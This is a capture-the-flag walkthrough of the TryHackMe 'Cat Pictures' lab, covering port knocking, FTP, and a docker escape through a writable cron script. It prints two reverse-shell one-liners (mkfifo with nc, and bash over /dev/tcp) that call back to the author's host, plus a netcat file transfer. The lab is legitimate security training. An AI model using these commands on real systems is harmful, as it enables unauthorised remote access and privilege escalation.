---
title: "TryHackMe - Cat Pictures"
author: Nasrallah
description: ""
date: 2022-11-17 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, docker, knocking, cronjob, ftp, reverse-shell]
img_path: /assets/img/tryhackme/catpictures
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Cat Pictures](https://tryhackme.com/room/catpictures) from [TryHackMe](https://tryhackme.com). In this machine, we get to use a technique called `port knocking` that would make a port open automatically. We find a password of one service in the ports we open and use it to get foothold. Then we exploit a cronjob to escape a docker container.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.46.77
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
Nmap scan report for 10.10.187.26                                             
Host is up (0.081s latency).                                                  
                                                                              
PORT     STATE    SERVICE      VERSION                                        
21/tcp   filtered ftp                                                         
22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                                
|   2048 37436480d35a746281b7806b1a23d84a (RSA)                           
|   256 53c682efd27733efc13d9c1513540eb2 (ECDSA)                          
|_  256 ba97c323d4f2cc082ce12b3006189541 (ED25519)                        
4420/tcp open     nvm-express?                                                
| fingerprint-strings:                                                        
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest:  
|     INTERNAL SHELL SERVICE                                                  
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c                                                                  
|     Please enter password:                                                  
|     Invalid password...                                                     
|     Connection Closed                                                       
|   NULL, RPCCheck: 
|     INTERNAL SHELL SERVICE                                                                                                                                 
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|_    Please enter password:         

8080/tcp open     http    Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
|_http-title: Cat Pictures - Index page
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We found 3 open ports, 22 running OpenSSH and 8080 running Apache http web server. We also found port 21 filtered which is the default port for ftp.

## Web

Let's go to the web page.

![](1.png)

The web server uses `phpbb` which is a free and open source forum software.

We can find one post that hints for a technique.

![](2.png)

## Port knocking

Port-knocking the a obfuscation-as-security technique. It basically means that after knocking on ports in a specific sequence a certain port will open automatically.

We can do that using `knock`, if you don't have it, install it with `apt install knockd`.

![](3.png)

After running it a couple of times, port 21 should be open. Let's connect to it as anonymous.

![](4.png)

We managed to connect to the ftp server and find a note.

The note contains the password of port 4420, let's connect to that port with `nc 10.10.10.10. 4420`

![](5.png)

We got a shell

# **Foothold**

I setup a listener and run the following command to get a reverse shell.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.10.10 9000 >/tmp/f
```

![](6.png)

After checking the home directory, we find an executable inside `catlover`'s home directory, when we run it, we get prompt for a password.

```terminal
I have no name!@cat-pictures:/home/catlover# ./runme 
./runme
Please enter yout password: password
Access Denied
I have no name!@cat-pictures:/home/catlover#
```

I tried the previous password but didn't work. Let's copy the file to our machine using netcat.

```terminal
┌──(sirius㉿kali)-[~/CTF/THM/catpics]
└─$ nc -lvnp 1234 > runme 
```

```terminal
I have no name!@cat-pictures:/home/catlover# nc 10.10.10.10 1234 < ./runme

```

We check the file for human readable characters with `strings`, and we find the password.

![](7.png)

Let's run the file again.

```terminal
I have no name!@cat-pictures:/home/catlover# ./runme
./runme
Please enter yout password: rebecca
Welcome, catlover! SSH key transfer queued! 
I have no name!@cat-pictures:/home/catlover#
```

After a bit, we see an ssh private key in catlover's home directory.

![](8.png)

Let's copy that to our machine, give it the right permissions and connect with it.

![](9.png)

# **Privilege Escalation**

We can clearly see that we're in a docker container because of the name of the host and the docker file in root directory.

![](10.png)

Checking the different file on the system we come across a potential vector for escaping the docker container.

![](11.png)

The `clean.sh` file might be a cronjob running outside the container, so let's test it by adding the following reverse shell to it and setting up a listener.

```bash
bash -i >& /dev/tcp/10.10.10.10/9001 0>&1
```

![](12.png)

Great! We got a shell as root, couldn't been better.


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References

https://sushant747.gitbooks.io/total-oscp-guide/content/port_knocking.html